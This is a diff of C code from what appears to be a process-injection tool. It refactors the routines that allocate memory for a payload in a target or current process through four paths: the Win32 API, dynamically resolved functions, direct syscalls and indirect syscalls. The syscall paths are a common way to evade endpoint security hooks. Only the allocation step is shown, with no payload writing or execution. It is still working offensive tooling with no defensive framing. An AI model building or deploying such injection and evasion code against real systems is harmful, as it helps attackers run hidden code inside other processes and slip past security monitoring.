@@ -4,18 +4,13 @@
 
 BOOL Win32Allocate(PINJECTION_CONTEXT ctx, DWORD protect)
 {
-    // Local process allocation
-    if (ctx->hProcess == (HANDLE)-1)
-    {
-        ctx->pRemoteAddress = VirtualAlloc(NULL,
-                                           ctx->payloadSize,
-                                           MEM_COMMIT | MEM_RESERVE,
-                                           protect);
-        return ctx->pRemoteAddress != NULL;
-    }
+    HANDLE target = (ctx->hProcess == (HANDLE)-1)
+                    ? GetCurrentProcess()
+                    : ctx->hProcess;
 
-    // Remote process allocation
-    ctx->pRemoteAddress = VirtualAllocEx(ctx->hProcess,
+    printf("[*] Using Win32 API to invoke VirtualAllocEx.\n");
+
+    ctx->pRemoteAddress = VirtualAllocEx(target,
                                          NULL,
                                          ctx->payloadSize,
                                          MEM_COMMIT | MEM_RESERVE,
@@ -29,16 +24,13 @@ BOOL DFRAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
     if (!g_VirtualAllocEx)
         return FALSE;
 
-    if (ctx->hProcess == (HANDLE)-1)
-    {
-        ctx->pRemoteAddress = VirtualAlloc(NULL,
-                                           ctx->payloadSize,
-                                           MEM_COMMIT | MEM_RESERVE,
-                                           protect);
-        return ctx->pRemoteAddress != NULL;
-    }
+    HANDLE target = (ctx->hProcess == (HANDLE)-1)
+                    ? GetCurrentProcess()
+                    : ctx->hProcess;
 
-    ctx->pRemoteAddress = g_VirtualAllocEx(ctx->hProcess,
+    printf("[*] Using DFR to invoke VirtualAllocEx.\n");
+
+    ctx->pRemoteAddress = g_VirtualAllocEx(target,
                                            NULL,
                                            ctx->payloadSize,
                                            MEM_COMMIT | MEM_RESERVE,
@@ -49,19 +41,16 @@ BOOL DFRAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
 
 BOOL DirectAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
 {
-    if (ctx->hProcess == (HANDLE)-1)
-    {
-        ctx->pRemoteAddress = VirtualAlloc(NULL,
-                                           ctx->payloadSize,
-                                           MEM_COMMIT | MEM_RESERVE,
-                                           protect);
-        return ctx->pRemoteAddress != NULL;
-    }
+    HANDLE target = (ctx->hProcess == (HANDLE)-1)
+                    ? NtCurrentProcess()
+                    : ctx->hProcess;
 
     PVOID baseAddr = NULL;
     SIZE_T regionSize = ctx->payloadSize;
 
-    NTSTATUS status = SysNtAllocateVirtualMemory(ctx->hProcess,
+    printf("[*] Using direct syscalls to invoke NtAllocateVirtualMemory.\n");
+
+    NTSTATUS status = SysNtAllocateVirtualMemory(target,
                                                  &baseAddr,
                                                  0,
                                                  &regionSize,
@@ -76,22 +65,25 @@ BOOL DirectAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
 
 BOOL IndirectAllocate(PINJECTION_CONTEXT ctx, DWORD protect)
 {
-    if (ctx->hProcess == (HANDLE)-1)
-    {
-        ctx->pRemoteAddress = VirtualAlloc(NULL,
-                                           ctx->payloadSize,
-                                           MEM_COMMIT | MEM_RESERVE,
-                                           protect);
-        return ctx->pRemoteAddress != NULL;
-    }
+    HANDLE target = (ctx->hProcess == (HANDLE)-1)
+                    ? NtCurrentProcess()
+                    : ctx->hProcess;
+
+    PVOID baseAddr = NULL;
+    SIZE_T regionSize = ctx->payloadSize;
+
+    printf("[*] Using indirect syscalls to invoke NtAllocateVirtualMemory.\n");
 
     NTSTATUS status = IndirectSysNtAllocateVirtualMemory(
-        ctx->hProcess,
-        &ctx->pRemoteAddress,
+        target,
+        &baseAddr,
         0,
-        &ctx->payloadSize,
+        &regionSize,
         MEM_COMMIT | MEM_RESERVE,
         protect);
+
+    if (status == 0)
+        ctx->pRemoteAddress = baseAddr;
 
     return (status == 0);
 }
